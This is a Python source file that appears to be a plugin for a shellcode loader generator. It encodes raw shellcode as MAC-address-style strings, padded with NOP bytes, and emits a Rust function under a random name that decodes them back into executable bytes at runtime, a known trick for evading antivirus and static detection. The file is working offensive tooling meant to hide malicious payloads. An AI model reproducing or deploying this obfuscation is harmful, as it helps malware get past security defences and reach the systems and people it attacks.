import random
import string

class MACObfuscate:

    def __init__(self, arguments: dict) -> None:
        self.name = ''.join(random.SystemRandom().choice(string.ascii_lowercase) for _ in range(16))

    def imports(self) -> list[str]:
        return []

    def compilerOptions(self) -> list[str]:
        return []

    def obfuscate(self, decoded: bytes) -> list[str]:
        encoded = []
        self.size = len(decoded)
        for i in range(0, len(decoded), 6):
            chunk = decoded[i:i+6]
            if len(chunk) < 6:
                chunk = chunk + (b"\x90" * (6 - len(chunk)))
            encoded.append('-'.join([ f'{chunk[n]:02x}' for n in range(0, 6)]))
        return encoded

    def transformer(self, shellcodestring: str) -> str:
        return shellcodestring.format(shellcode=f'{self.name}(&{{shellcode}})')

    def codeblock(self) -> str:
        return f"""
fn {self.name}(encoded: &Vec<String>) -> Vec<u8> {{
    let mut decoded = vec![0; {self.size}];
    for (i, mac) in encoded.iter().enumerate(){{
        let macbytes: Vec<&str> = mac.split('-').collect();
        for (j, macbyte) in macbytes.iter().enumerate(){{
            if i*6+j >= {self.size}{{
                return decoded.to_vec()
            }}
            decoded[i*6 + j] =  u8::from_str_radix(macbyte, 16).unwrap();
        }}
    }}
    decoded
}}
"""